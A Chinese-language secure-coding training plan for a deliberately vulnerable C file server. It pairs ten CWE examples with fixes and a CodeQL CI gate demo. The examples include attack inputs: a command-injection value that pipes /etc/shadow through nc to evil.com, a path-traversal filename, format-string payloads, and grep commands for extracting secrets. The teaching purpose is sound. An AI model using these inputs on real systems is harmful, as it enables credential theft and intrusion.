# 安全编码培训策划案

> **项目**: SecureFile Vault  
> **仓库**: https://github.com/CheneyChenStar/secure_ci_coding  
> **培训时长**: 5-7 天（三个阶段）  
> **目标受众**: 有 C 语言基础但缺乏安全编码经验的开发人员

---

## 目录

- [一、漏洞原理讲解与安全编码实践](#一漏洞原理讲解与安全编码实践)
- [二、安全 CI 配置设计讲解](#二安全-ci-配置设计讲解)
- [三、CI 流水线卡点演示（逐步命令）](#三ci-流水线卡点演示逐步命令)

---

# 一、漏洞原理讲解与安全编码实践

## 漏洞 1：缓冲区溢出 (CWE-120)

### 原理

栈上分配了固定大小的数组，但拷贝数据时使用了攻击者控制的长度，未校验边界。

```c
/* ❌ 漏洞代码 — src/protocol.c:proto_dispatch() */
char filename[MAX_FILENAME_LEN];       // 256 字节栈缓冲区
memcpy(filename, data, data_len);      // data_len 来自网络 → 攻击者设为 > 256
// 栈布局：[filename 256B][saved rbp 8B][return address 8B]
// 攻击者覆盖 return address → 控制程序执行流
```

**栈帧布局示意**:
```
高地址  +------------------+
        |   return address  | ← 被覆盖为攻击者地址
        +------------------+
        |   saved rbp       | ← 被覆盖
        +------------------+
低地址  |   filename[255]   |
        |   ...             |
        |   filename[0]     |
        +------------------+
```

### 攻击影响

远程代码执行 (RCE) — 攻击者获得服务器 shell。

### 修复方式

```c
/* ✅ 安全代码 */
#define MIN(a,b) ((a) < (b) ? (a) : (b))

char filename[MAX_FILENAME_LEN];

/* 1. 先校验再拷贝 */
if (data_len >= MAX_FILENAME_LEN) {
    return PROTO_ERR_LENGTH;  // 拒绝，不截断
}

/* 2. 精确拷贝 + 显式空终止 */
memcpy(filename, data, data_len);
filename[data_len] = '\0';
```

### 安全编码最佳实践

1. **永远不要信任输入中的长度字段** — 来自网络、文件、用户输入的所有长度值必须校验
2. **使用有界函数**: `strncpy`, `snprintf`, `memcpy_s`（C11 Annex K）
3. **启用编译时保护**:
   ```bash
   -fstack-protector-strong    # 栈金丝雀 (canary)
   -D_FORTIFY_SOURCE=2         # 有界函数运行时检查
   -fPIE -pie                  # ASLR
   ```

---

## 漏洞 2：格式化字符串 (CWE-134)

### 原理

`printf` 家族函数的第一个参数是**格式字符串**，控制后续参数的解析方式。当用户输入被直接当作格式字符串传入时，攻击者使用 `%x` 读栈、`%n` 写任意地址。

```c
/* ❌ 漏洞代码 — src/logger.c:log_write() */
void log_write(level, format, ...) {
    vfprintf(log_fp, format, args);  // format = 用户输入的文件名
}

// 调用方：
log_write(LOG_INFO, req->filename);  // filename 可能是 "%x%x%x%n"
```

### 攻击效果

```bash
# 信息泄露（栈内容）
$ ./vuln_fmtstr "%x.%x.%x.%x"
# 输出: [INFO] 7fff1234.deadbeef.1.4012345   ← 泄露了栈地址、返回地址等

# 任意写（写入已输出的字符数到指定地址）
$ ./vuln_fmtstr "AAAA%x%x%x%x%x%x%n"
# 向地址 0x41414141 写入累计输出字节数
```

### 修复方式

```c
/* ✅ 安全代码 — 用户数据始终作为参数传递 */
fprintf(log_fp, "%s", user_data);  // 固定格式字符串，"%s" 不可控

// 使用编译器属性防止误用
__attribute__((format(printf, 2, 3)))
void log_write(int level, const char *format, ...);
// 编译时警告: log_write(INFO, user_data); ← 不是字符串字面量!
```

### 安全编码最佳实践

1. **日志/输出函数永远使用固定格式字符串**: `printf("%s", data)`
2. **启用编译器格式检查**: `__attribute__((format(printf, ...)))`
3. **编译选项**: `-Wformat=2 -Wformat-security`

---

## 漏洞 3：Use-After-Free (CWE-416)

### 原理

堆内存被 `free()` 释放后，原指针仍持有地址（悬挂指针）。后续通过该指针访问已释放的内存，读取到的是被其他分配复用的数据，造成逻辑错误或信息泄露。

```c
/* ❌ 漏洞代码 — src/session.c */
void session_destroy(session_t *s) {
    free(s);        // 释放内存
    // BUG: s 没有置 NULL！
}
// 调用方:
session_destroy(conn->session);  // conn->session 现在是悬挂指针
// ...
if (session_validate(conn->session)) {  // ← UAF! 读取已释放的内存
    // 可能认为 session 仍然有效
}
```

### 攻击利用

```
时间线:
1. free(session_A)         ← session_A 归还给堆分配器
2. malloc(sizeof(X))       ← X 可能恰好占据 session_A 的内存
3. session_validate(session_A)  ← 读取的是 X 的数据!
```

攻击者通过控制释放后的内存布局，操纵 `s->active` 和 `s->expires_at` 的值，绕过会话验证。

### 修复方式

```c
/* ✅ 安全代码 */
#define SAFE_FREE(p) do { if (p) { free(p); (p) = NULL; } } while (0)

// 方案 1: 使用双指针，函数内 NULL 掉调用方指针
void session_destroy(session_t **s_ptr) {
    if (!s_ptr || !*s_ptr) return;
    free(*s_ptr);
    *s_ptr = NULL;  // 调用方的指针被置 NULL
}
session_destroy(&conn->session);  // conn->session 现在是 NULL

// 方案 2: 每次解引用前检查 NULL + 有效性
int session_validate(session_t *s) {
    if (!s) return 0;             // NULL 检查
    // 额外检查: s 是否还在活跃表中
    for (int i = 0; i < session_count; i++)
        if (sessions[i] == s)     // 确认仍在表中
            return s->active && time(NULL) < s->expires_at;
    return 0;  // 不在表中 → 已释放
}
```

### 安全编码最佳实践

1. **释放后立即置 NULL**: `free(p); p = NULL;`
2. **解引用前检查 NULL**
3. **使用 Valgrind / AddressSanitizer 在测试环境检测**
4. **考虑使用引用计数或 RAII 模式**

---

## 漏洞 4：Double Free (CWE-415)

### 原理

同一指针被释放两次。第一次 free 可能成功，第二次 free 时该内存已处于释放状态，破坏堆分配器的内部链表。

```c
/* ❌ 漏洞代码 — src/network.c:conn_close() */
void conn_close(connection_t *conn) {
    if (conn->session) {
        if (shutdown(conn->fd, SHUT_WR) < 0) {
            free(conn->buffer);     // 第一次 free — BUG: 没有 conn->buffer = NULL
            goto cleanup;
        }
    }
    free(conn->buffer);             // 正常路径
cleanup:
    free(conn->buffer);             // ← 第二次 free! (如果 goto 过来的话)
    free(conn);
}
```

### 攻击影响

堆分配器元数据损坏 → 后续 malloc/free 行为异常 → 任意写原语 → RCE。

### 修复方式

```c
/* ✅ 安全代码 */
void conn_close_fixed(connection_t *conn) {
    if (!conn) return;

    SAFE_FREE(conn->buffer);  // 内部: free(p); p = NULL;
    // 第二次 SAFE_FREE(conn->buffer) 时 buffer 已是 NULL → free(NULL) 安全

    if (conn->fd > 0) close(conn->fd);
    SAFE_FREE(conn);
}
```

### 安全编码最佳实践

1. **永远使用 SAFE_FREE 宏** — 封装 free + NULL 赋值
2. **避免 goto 跨越资源释放逻辑**
3. **单点退出 + RAII 风格**

---

## 漏洞 5：整数溢出 (CWE-190)

### 原理

无符号整数算术回绕：`SIZE_MAX + 1 == 0`。分配器可能返回极小的缓冲区，但后续操作按原始大小写入。

```c
/* ❌ 漏洞代码 — src/file_handler.c:file_store() */
size_t required = data_len + 1;       // data_len == SIZE_MAX → required = 0
char *copy_buf = malloc(required);    // malloc(0) → 返回小缓冲区 (实现定义)
memcpy(copy_buf, data, data_len);     // 写入 SIZE_MAX 字节 → 堆完全损坏
```

### 修复方式

```c
/* ✅ 安全代码 */
#define MAX_FILE_SIZE (16 * 1024 * 1024)  // 16 MB 业务上限

if (data_len == 0 || data_len > MAX_FILE_SIZE) {
    return -1;  // 拒绝
}

// 即使 data_len == SIZE_MAX - 10，+1 不会溢出因为 data_len <= MAX_FILE_SIZE
size_t required = data_len + 1;  // 安全
char *copy_buf = malloc(required);
```

### 安全编码最佳实践

1. **设置业务上限** — 确保任何运算都不会接近类型极限
2. **显式溢出检查**: `if (a > SIZE_MAX - b) overflow;`
3. **对每个算术运算问**: 这个值从哪里来？最大值是多少？

---

## 漏洞 6：命令注入 (CWE-78)

### 原理

`system()` 调起 `/bin/sh -c <cmd>`。用户输入中的 shell 元字符（`;`, `|`, `&&`, `` ` ``）被 shell 解释执行。

```c
/* ❌ 漏洞代码 — src/config.c:config_backup() */
snprintf(cmd, sizeof(cmd), "cp -r /etc/securefile %s", dest_path);
system(cmd);
// 攻击: dest_path = "/tmp/x; cat /etc/shadow | nc evil.com 4444 #"
// system 实际执行:  cp -r /etc/securefile /tmp/x
//                    cat /etc/shadow | nc evil.com 4444
//                    #  ← 注释掉后续内容
```

### 修复方式

```c
/* ✅ 安全代码 — fork + execve */
pid_t pid = fork();
if (pid == 0) {
    // 子进程: execve 直接执行目标程序，不经过 /bin/sh
    const char *argv[] = {"cp", "-r", "/etc/securefile", dest_path, NULL};
    execvp("cp", argv);
    _exit(127);
} else if (pid > 0) {
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}
```

**关键区别**: 在 `execve()` 中，`dest_path` 只是 `cp` 命令的一个**字符串参数**，不会被 parse 为命令。

### 安全编码最佳实践

1. **绝不使用**: `system()`, `popen()`, `exec*()` with `sh -c`
2. **始终使用**: `fork()` + `execve()` / `execvp()`
3. **输入验证**: 即使使用 execve，也过滤 shell 元字符作为纵深防御
4. **优先使用库函数**: 如 `rename()`, `copyfile()` 代替外部命令

---

## 漏洞 7：路径遍历 (CWE-22)

### 原理

文件名中包含 `../` 序列，可以跳出预期的基础目录访问任意文件。

```c
/* ❌ 漏洞代码 — src/file_handler.c:file_retrieve() */
snprintf(full_path, sizeof(full_path), "%s/%s", "/data/files", filename);
FILE *fp = fopen(full_path, "rb");
// 攻击: filename = "../../../etc/shadow"
// full_path = "/data/files/../../../etc/shadow" = "/etc/shadow"
```

### 修复方式

```c
/* ✅ 安全代码 */
// 1. 拒绝危险字符
if (strstr(filename, ".."))    return -1;
if (strchr(filename, '/'))     return -1;
if (strchr(filename, '\\'))    return -1;

// 2. 构造完整路径
char full_path[PATH_MAX];
snprintf(full_path, sizeof(full_path), "%s/%s", base_dir, filename);

// 3. 解析规范路径 (消除 .. 和符号链接)
char resolved[PATH_MAX];
if (realpath(full_path, resolved) == NULL) return -1;

// 4. 验证前缀匹配
if (strncmp(resolved, base_dir, strlen(base_dir)) != 0) {
    return -1;  // 路径逃逸!
}

FILE *fp = fopen(resolved, "rb");
```

### 安全编码最佳实践

1. **白名单 + 拒绝已知攻击模式**: 拒绝 `..`, `/`, `\`
2. **使用 `realpath()` 解析规范路径**
3. **验证前缀匹配**: 确保最终路径以允许的目录开头
4. **考虑 chroot / sandbox** 作为纵深防御

---

## 漏洞 8：不安全随机数 (CWE-338)

### 原理

`rand()` 是线性同余生成器 (LCG)，完全可预测。默认种子 `srand(1)` 产生固定序列。

```c
/* ❌ 漏洞代码 — src/session.c:session_create() */
uint32_t session_id = (uint32_t)rand();       // srand(1) 默认
snprintf(token, 64, "%08x%08x", rand(), rand());

// 每次程序启动 → 相同序列:
// Rand 1: 1804289383
// Rand 2: 846930886
// Rand 3: 1681692777    ← 攻击者可以用脚本枚举所有可能值
```

**rand() 的问题**:
- 状态空间仅 2³¹ (~20 亿)，现代 CPU 秒级枚举
- 默认种子 1，每次重启相同序列
- 即使 `srand(time(NULL))`，时间精度秒级，攻击者可以爆破

### 修复方式

```c
/* ✅ 安全代码 */
uint32_t generate_session_id(void) {
    uint32_t id;
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (urandom) {
        fread(&id, sizeof(id), 1, urandom);
        fclose(urandom);
    } else {
        // 紧急回退 — 仍不安全但比 rand() 好
        id = (uint32_t)((uintptr_t)&id) ^ (uint32_t)time(NULL) ^ (uint32_t)getpid();
    }
    return id;
}
```

### 安全编码最佳实践

| 平台 | 推荐函数 |
|------|---------|
| Linux | `getrandom()`, `/dev/urandom` |
| BSD/macOS | `arc4random()`, `arc4random_buf()` |
| OpenSSL | `RAND_bytes()` |

**绝不使用**: `rand()`, `random()`, `srand(time(NULL))`

---

## 漏洞 9：未校验输入 (CWE-20)

### 原理

外部输入直接用于安全敏感操作，未经长度、字符集、格式校验。

```c
/* ❌ 漏洞代码 — src/auth.c:auth_verify() */
int auth_verify(const char *username, const char *password) {
    // username 来自网络，长度未知，字符未校验
    for (i = 0; i < user_count; i++) {
        if (strcmp(users[i].username, username) == 0 &&  // 可能超长
            strcmp(users[i].password_hash, hash) == 0) {
            return 1;
        }
    }
}
```

### 修复方式

```c
/* ✅ 安全代码 — 边界校验 + 字符白名单 */
static bool validate_username(const char *username) {
    if (!username) return false;

    size_t len = strlen(username);
    if (len == 0 || len >= MAX_USERNAME_LEN) return false;  // 长度校验

    for (size_t i = 0; i < len; i++) {
        char c = username[i];
        if (!isalnum((unsigned char)c) && c != '_' && c != '-' && c != '.')
            return false;  // 字符白名单
    }
    return true;
}
```

### 安全编码最佳实践

1. **信任边界校验**: 所有外部输入在进入系统时立即校验
2. **白名单 > 黑名单**: "允许什么" 比 "禁止什么" 更可靠
3. **校验维度**: 长度 + 类型 + 范围 + 格式
4. **拒绝原则**: 不合规就拒绝，不要试图"修复"

---

## 漏洞 10：硬编码密钥 (CWE-798)

### 原理

密钥/凭据嵌入源代码，编译进二进制。任何人获取二进制文件即可提取。

```c
/* ❌ 漏洞代码 — src/auth.c:auth_hash_password() */
const char key[] = "SecretKey2024!@#";  // 编译进二进制
// 提取: $ strings securefile_server | grep Secret
// → SecretKey2024!@#
```

### 攻击手段

```bash
# 从二进制提取密钥
strings securefile_server | grep -E 'key|secret|password|token'

# 从 Git 历史提取
git log -p | grep -E 'key|secret|password'

# 反编译查看
objdump -s -j .rodata securefile_server | grep -A2 Secret
```

### 修复方式

```c
/* ✅ 安全代码 */
// 1. 从环境变量读取
const char *key = getenv("SECUREFILE_ENC_KEY");
if (!key) {
    log_error("Encryption key not configured");
    return -1;
}

// 2. 使用标准密码哈希算法
// PBKDF2-HMAC-SHA256, 100,000 次迭代, 随机盐
unsigned char salt[16];
RAND_bytes(salt, sizeof(salt));

unsigned char derived[32];
PKCS5_PBKDF2_HMAC(password, strlen(password),
                  salt, sizeof(salt), 100000,
                  EVP_sha256(), sizeof(derived), derived);
```

### 安全编码最佳实践

1. **绝不硬编码**: 密钥、密码、Token、API Key
2. **使用环境变量或密钥管理服务**: AWS KMS, HashiCorp Vault
3. **使用标准密码哈希**: bcrypt, scrypt, argon2, PBKDF2 (≥100K 迭代)
4. **`.gitignore` 保护**: 绝不允许 `.env`, `credentials.json` 进入仓库
5. **扫描提交历史**: `git-secrets`, `trufflehog`

---

# 二、安全 CI 配置设计讲解

## 2.1 总体架构

```
┌──────────────────────────────────────────────────────────────┐
│                     GitHub Repository                        │
│                                                              │
│  push/PR  ──► GitHub Actions                                │
│                    │                                         │
│                    ├─► Checkout code                         │
│                    ├─► Install dependencies                  │
│                    ├─► CodeQL Init (cpp, security-and-quality)│
│                    ├─► Build (make fixed)                    │
│                    ├─► CodeQL Analyze → SARIF                │
│                    ├─► Upload SARIF to Security tab          │
│                    └─► Parse SARIF → Quality Gate            │
│                         ├─ Critical CWE → exit 1 (阻断)     │
│                         └─ Warning CWE → exit 0 (通过)      │
└──────────────────────────────────────────────────────────────┘
```

## 2.2 关键配置文件

### `.github/workflows/codeql-analysis.yml`

```yaml
name: "CodeQL Security Analysis"

on:
  push:
    branches: [main, develop, 'training/**']  # 推送到这些分支触发
    paths-ignore: ['docs/**', '**.md']         # 文档变更不触发
  pull_request:
    branches: [main, develop]                  # PR 到这些分支触发
  schedule:
    - cron: '28 3 * * 2'                      # 每周二凌晨扫描
  workflow_dispatch:                            # 手动触发

jobs:
  codeql:
    runs-on: ubuntu-latest
    permissions:
      security-events: write  # 写入 Security tab
      actions: read
      contents: read

    strategy:
      fail-fast: false
      matrix:
        language: [c-cpp]
        build-mode: [manual]  # 自定义 build 命令

    steps:
      - uses: actions/checkout@v4

      - name: Install build dependencies
        run: sudo apt-get update && sudo apt-get install -y libssl-dev

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: c-cpp
          config-file: ./.codeql/codeql-config.yml
          queries: security-and-quality  # 使用安全+质量规则集

      - name: Build (Fixed version)
        run: make fixed

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3
        with:
          category: "/language:c-cpp"
          output: sarif-results
          upload: true  # 自动上传到 Security tab

      - name: Parse SARIF and enforce quality gate
        run: |
          SARIF_FILE=$(ls sarif-results/*.sarif | head -1)
          python3 scripts/check_sarif.py "$SARIF_FILE"
          # exit 0 = PASS, exit 1 = BLOCK
```

### `.codeql/codeql-config.yml`

```yaml
name: "SecureFile Vault CodeQL Configuration"
disable-default-queries: false

packs:
  - codeql/cpp-queries  # CodeQL C/C++ 标准规则包

query-filters:
  - include:  # 必须包含的安全规则
      id:
        - cpp/potentially-dangerous-function    # system, rand, localtime...
        - cpp/unsafe-strcpy                     # strcpy 无边界
        - cpp/very-likely-overrunning-write     # 高概率越界写
        - cpp/overrunning-write                 # 越界写
        - cpp/use-after-free                    # UAF
        - cpp/double-free                       # Double Free
        - cpp/command-line-injection            # 命令注入
        - cpp/hardcoded-credentials             # 硬编码凭据
        - cpp/weak-cryptographic-algorithm      # 弱加密
        - cpp/path-injection                    # 路径注入
        - cpp/tainted-format-string             # 格式化字符串
        - cpp/unbounded-write                   # 无界写
        - cpp/badly-bounded-write               # 不足界写
        - cpp/uncontrolled-arithmetic           # 未控制算术

  - exclude:  # 排除非安全性噪声
      id:
        - cpp/unused-local-variable
        - cpp/unused-static-function
        - cpp/missing-header-guard

paths: [src, include, fixed]       # 扫描这些目录
paths-ignore: [vulnerable, tests, scripts, docker, docs]  # 忽略训练/测试
```

### `scripts/check_sarif.py` — 质量门禁逻辑

```python
# 阻断 Critical 漏洞
BLOCKING_CWES = {
    "CWE-120": "Buffer Overflow",
    "CWE-416": "Use-After-Free",
    "CWE-415": "Double Free",
    "CWE-78":  "Command Injection",
    "CWE-798": "Hardcoded Credentials",
}

# 仅告警不阻断
WARNING_CWES = {
    "CWE-134": "Format String",
    "CWE-190": "Integer Overflow",
    "CWE-338": "Insecure Random",
    "CWE-22":  "Path Traversal",
    "CWE-20":  "Unchecked Input",
}

# Blocking rule IDs (CodeQL 特定)
blocking_ids = [
    "cpp/unsafe-strcpy",
    "cpp/unbounded-write",
    "cpp/very-likely-overrunning-write",
    "cpp/overrunning-write",
    "cpp/use-after-free",
    "cpp/double-free",
    "cpp/command-line-injection",
    "cpp/hardcoded-credentials",
]

# 判定逻辑
def classify_result(result):
    # 1. 检查 CWE 标签 → 匹配 BLOCKING_CWES → 阻断
    # 2. 检查 rule_id  → 匹配 blocking_ids → 阻断
    # 3. 其余 → warning (不阻断)

# 如果有 blocking → exit(1) → CI 失败
# 如果无 blocking → exit(0) → CI 通过
```

## 2.3 两级门禁策略

| 等级 | 漏洞 | 行为 | 原因 |
|------|------|------|------|
| **阻断** | CWE-120 缓冲区溢出 | exit 1 | 直接导致 RCE |
| **阻断** | CWE-416 UAF | exit 1 | 直接导致 RCE |
| **阻断** | CWE-415 Double Free | exit 1 | 直接导致 RCE |
| **阻断** | CWE-78 命令注入 | exit 1 | 直接导致 RCE |
| **阻断** | CWE-798 硬编码密钥 | exit 1 | 凭据泄露 |
| **阻断** | strcpy/sprintf 等不安全函数 | exit 1 | 高危模式 |
| **告警** | CWE-134 格式化字符串 | exit 0 | 需要人工判断 |
| **告警** | CWE-190 整数溢出 | exit 0 | 可能有业务上限保护 |
| **告警** | CWE-22 路径遍历 | exit 0 | 需要更复杂的攻击链 |
| **告警** | CWE-338 不安全随机数 | exit 0 | 取决于使用场景 |

## 2.4 防止绕过

1. **分支保护规则** — GitHub Settings → Branches → Add rule:
   ```
   Branch: main
   ✓ Require a pull request before merging
   ✓ Require status checks to pass: "CodeQL Analysis"
   ✓ Require conversation resolution before merging
   ```

2. **禁止直接推送 main** — 已在分支保护中配置

3. **禁止内联抑制** — 不允许在源码中使用 `// lgtm[skip]` 或 `// nosemgrep`

4. **Workflow 修改需额外审批** — CODEOWNERS 文件:
   ```
   .github/workflows/**  @security-team
   .codeql/**            @security-team
   ```

---

# 三、CI 流水线卡点演示（逐步命令）

## 3.1 环境准备

```bash
# 1. 克隆仓库
git clone https://github.com/CheneyChenStar/secure_ci_coding.git
cd secure_ci_coding

# 2. 查看项目结构
tree -L 2 -I build

# 3. 查看当前分支和 CI 状态
git branch -a
gh run list --repo CheneyChenStar/secure_ci_coding --limit 5
```

## 3.2 场景一：初始推送 → CodeQL 发现 7 个告警 → CI 阻断

### 步骤 1: 查看初始提交内容

```bash
# 初始提交包含所有 src/ 源码 (含 10 个漏洞)
git log --oneline main~2..main
# 4e7ff5e feat: SecureFile Vault — secure coding training project

# 查看漏洞代码示例
grep -n "VULNERABILITY" src/protocol.c src/logger.c src/session.c src/network.c
```

### 步骤 2: 查看 CI 运行结果

```bash
# 第一个 CI 运行
gh run view 25423966582 --repo CheneyChenStar/secure_ci_coding

# 查看质量门禁输出
gh run view 25423966582 --repo CheneyChenStar/secure_ci_coding --log | grep -A10 'Parse SARIF'
```

**输出示例**:
```
=== CodeQL Quality Gate ===
Analyzing: sarif-results/cpp.sarif

Total findings: 7
  Blocking: 4
  Warnings: 3
  Info:     0

=== BLOCKING FINDINGS ===
  [cpp/very-likely-overrunning-write] CWE-120
    This 'call to realpath' may overflow the destination
    at src/file_handler.c:73

  [cpp/very-likely-overrunning-write] CWE-120
    This 'call to realpath' may overflow the destination
    at src/file_handler.c:79

  [cpp/very-likely-overrunning-write] CWE-120
    This 'call to realpath' may overflow the destination
    at src/file_handler.c:157

  [cpp/potentially-dangerous-function] CWE-N/A
    Call to 'localtime' is potentially dangerous
    at src/logger.c:38

QUALITY GATE: FAILED (4 blocking finding(s))
```

### 步骤 3: 查看 GitHub Security Tab 告警

```bash
# 查看 CodeQL 告警
gh api repos/CheneyChenStar/secure_ci_coding/code-scanning/alerts \
  --jq '.[] | "\(.rule.id) [\(.state)] \(.most_recent_instance.location.path):\(.most_recent_instance.location.start_line)"'
```

或在浏览器打开: https://github.com/CheneyChenStar/secure_ci_coding/security/code-scanning

## 3.3 场景二：修复 blocking 告警 → CI 通过

### 步骤 4: 修复代码

```bash
# 修复 1: localtime → localtime_r (logger.c)
# Before: struct tm *tm = localtime(&now);
# After:  struct tm tm_buf; struct tm *tm = localtime_r(&now, &tm_buf);

# 修复 2: realpath buffer size (file_handler.c)
# Before: char resolved[MAX_PATH_LEN];   // 512 bytes
# After:  char resolved[PATH_MAX];       // 4096 bytes + #include <limits.h>

# 修复 3: CLI path validation (main.c)
# Added: strlen(path) < MAX_PATH_LEN check
```

### 步骤 5: 推送到 main，触发 CI

```bash
git add src/logger.c src/file_handler.c src/main.c
git commit -m "fix: resolve CodeQL findings in FIXED build path"
git push

# 监控 CI 运行
gh run watch --repo CheneyChenStar/secure_ci_coding --exit-status
```

### 步骤 6: 验证 CI 通过

```bash
# 查看结果
gh run view <run_id> --repo CheneyChenStar/secure_ci_coding --log | grep -A5 'GATE'
```

**输出**:
```
Total findings: 0
  Blocking: 0
  Warnings: 0
  Info:     0

QUALITY GATE: PASSED
```

### 步骤 7: 确认告警状态变更

```bash
gh api repos/CheneyChenStar/secure_ci_coding/code-scanning/alerts \
  --jq '.[] | "\(.rule.id) [\(.state)] \(.most_recent_instance.location.path)"'
```

**输出**:
```
cpp/path-injection [open] src/main.c:161          ← 仅告警，不阻断
cpp/path-injection [open] src/main.c:167
cpp/path-injection [open] src/file_handler.c:102
cpp/very-likely-overrunning-write [fixed] src/file_handler.c:73  ← 已修复!
cpp/very-likely-overrunning-write [fixed] src/file_handler.c:79  ← 已修复!
cpp/very-likely-overrunning-write [fixed] src/file_handler.c:157 ← 已修复!
cpp/potentially-dangerous-function [fixed] src/logger.c:38       ← 已修复!
```

## 3.4 场景三：PR 引入新漏洞 → CodeQL 阻断 → 修复 → 通过 → 合并

### 步骤 8: 创建功能分支（模拟开发者写漏洞代码）

```bash
git checkout -b feature/add-backup-compress

# 在 main.c 中添加不安全的 strcpy 调用
# 编辑 src/main.c, 添加:
#   char env_user[32];
#   const char *env_val = getenv("SECUREFILE_ADMIN_USER");
#   if (env_val) {
#       strcpy(env_user, env_val);  // ← 漏洞! 无边界检查
#   }

git add src/main.c
git commit -m "feat: add admin user config from environment"
git push -u origin feature/add-backup-compress
```

### 步骤 9: 创建 PR，观察 CI 阻断

```bash
gh pr create \
  --base main \
  --head feature/add-backup-compress \
  --title "feat: add admin user config from environment"

# 查看 PR 检查状态
gh pr checks
# CodeQL Analysis (c-cpp, manual)  pending  0

# 等待 CI 完成
gh run watch --repo CheneyChenStar/secure_ci_coding --exit-status
```

### 步骤 10: PR 被阻断 — 查看 Security Gate 输出

**浏览器查看**: https://github.com/CheneyChenStar/secure_ci_coding/pull/1/checks

或命令行:
```bash
gh run view <run_id> --repo CheneyChenStar/secure_ci_coding --log | grep -A15 'BLOCKING'
```

**关键输出**:
```
=== CodeQL Quality Gate ===
Analyzing: sarif-results/cpp.sarif

Total findings: 1
  Blocking: 1
  Warnings: 0
  Info:     0

=== BLOCKING FINDINGS ===
  [cpp/unbounded-write]
    This 'call to strcpy' with input from an environment variable
    may overflow the destination (32 bytes).
    at src/main.c:157

QUALITY GATE: FAILED (1 blocking finding(s))

============================================
 SECURITY GATE FAILED
 Critical/high confidence findings detected.
 Please fix the issues listed above.
============================================
Process completed with exit code 1.
```

**PR 页面显示**: ❌ CodeQL Analysis — **失败**，Merge 按钮不可用。

### 步骤 11: 修复漏洞并推送

```bash
# 修复 main.c:
# - 添加 strlen(input) < MAX_USERNAME_LEN 校验
# - 替换 strcpy 为 strncpy + 显式 NUL 终止
# - 超长输入拒绝而不是截断

git add src/main.c
git commit -m "fix: replace unsafe strcpy with bounded strncpy"
git push
```

### 步骤 12: CI 通过，PR 可合并

```bash
gh run watch --repo CheneyChenStar/secure_ci_coding --exit-status
```

**输出**:
```
✓ CodeQL Analysis (c-cpp, manual) in 1m10s
  ✓ Build (Fixed version)
  ✓ Perform CodeQL Analysis
  ✓ Parse SARIF and enforce quality gate

Total findings: 0
  Blocking: 0
QUALITY GATE: PASSED
```

**PR 页面显示**: ✅ CodeQL Analysis — **通过**，Merge 按钮可用。

### 步骤 13: 合并 PR

```bash
gh pr merge 1 --squash --delete-branch

# 验证 main 分支 CI 通过
gh run list --repo CheneyChenStar/secure_ci_coding --limit 3
# 25433026967  success  feat: add backup compression module (#1)  main  push
```

## 3.5 完整 CI 流水线时间线

```
时间线
══════════════════════════════════════════════════════════════════

T0: 初始推送 (4e7ff5e)
    │
    ├─ CodeQL Init (15s) → Build (3s) → Analyze (30s) → Gate (2s)
    │
    └─ ❌ FAILED: 7 findings (4 blocking)
       ├─ cpp/very-likely-overrunning-write ×3  → BLOCKING
       ├─ cpp/potentially-dangerous-function ×1  → BLOCKING
       └─ cpp/path-injection ×3                  → WARNING

T1: 修复推送 (73995c8)
    │
    ├─ localtime→localtime_r, PATH_MAX fix, CLI validation
    │
    └─ ✅ PASSED: 0 blocking findings
       └─ 3 path-injection [open] → warning only

T2: PR 创建 (#1)
    │
    ├─ strcpy 漏洞被引入 main.c
    │
    └─ ❌ BLOCKED: 1 finding
       └─ cpp/unbounded-write → BLOCKING

T3: 修复推送 (eeb977f)
    │
    ├─ strcpy→strncpy + 长度校验
    │
    └─ ✅ PASSED: 0 findings
       └─ PR 可合并

T4: PR 合并 (67780c6)
    │
    └─ ✅ PASSED: main 分支 CI 绿色
```

## 3.6 培训演示命令速查表

```bash
# ═══════════════════════════════════════════════════════════════
# 培训环境设置
# ═══════════════════════════════════════════════════════════════
git clone https://github.com/CheneyChenStar/secure_ci_coding.git
cd secure_ci_coding

# Docker 构建与运行
docker compose -f docker/docker-compose.yml build dev
docker compose -f docker/docker-compose.yml up dev       # 漏洞版本 :9000
docker compose -f docker/docker-compose.yml up dev-fixed # 修复版本 :9001

# ═══════════════════════════════════════════════════════════════
# 查看 CI 历史
# ═══════════════════════════════════════════════════════════════
gh run list --repo CheneyChenStar/secure_ci_coding --limit 10
gh run view <run_id> --repo CheneyChenStar/secure_ci_coding
gh run view <run_id> --repo CheneyChenStar/secure_ci_coding --log
gh run view <run_id> --repo CheneyChenStar/secure_ci_coding --log | grep -A10 'GATE'

# ═══════════════════════════════════════════════════════════════
# 查看 Security Tab
# ═══════════════════════════════════════════════════════════════
# 浏览器: https://github.com/CheneyChenStar/secure_ci_coding/security/code-scanning

# 命令行:
gh api repos/CheneyChenStar/secure_ci_coding/code-scanning/alerts \
  --jq '.[] | "\(.rule.id) [\(.state)] \(.most_recent_instance.location.path):\(.most_recent_instance.location.start_line)"'

# ═══════════════════════════════════════════════════════════════
# 模拟完整 PR 工作流
# ═══════════════════════════════════════════════════════════════
# 1. 创建功能分支
git checkout -b feature/my-feature

# 2. 添加有漏洞的代码 (故意引入)
#    编辑 src/main.c ... 使用 strcpy 而不是 strncpy

# 3. 提交推送
git add -A && git commit -m "feat: my new feature"
git push -u origin feature/my-feature

# 4. 创建 PR
gh pr create --base main --head feature/my-feature \
  --title "feat: my new feature" \
  --body "Please review for security"

# 5. 等待 CI (应该失败!)
gh run watch --repo CheneyChenStar/secure_ci_coding --exit-status

# 6. 查看阻断原因
gh pr checks

# 7. 修复漏洞
#    编辑代码... strcpy → strncpy + 长度校验

# 8. 推送修复
git add -A && git commit -m "fix: security hardening"
git push

# 9. 等待 CI (应该通过!)
gh run watch --repo CheneyChenStar/secure_ci_coding --exit-status

# 10. 合并
gh pr merge <pr_number> --squash --delete-branch
```

---

## 附录：分支策略

| 分支 | 用途 | CodeQL 构建模式 |
|------|------|---------------|
| `main` | 生产代码 — 仅安全版本 | `make fixed` |
| `develop` | 开发集成分支 | `make fixed` |
| `training/vulnerable` | 阶段一：识别漏洞 | `make vulnerable` |
| `training/fix-assignment` | 阶段二：修复练习 | `make vulnerable` |
| `feature/*` | 新功能开发 | `make fixed` |

---

## 附录：全部 10 个漏洞在代码中的位置

| # | 漏洞 | 文件 | 行号区域 | grep 定位命令 |
|---|------|------|---------|--------------|
| 1 | 缓冲区溢出 | src/protocol.c | 120-140 | `grep -n "VULNERABILITY" src/protocol.c` |
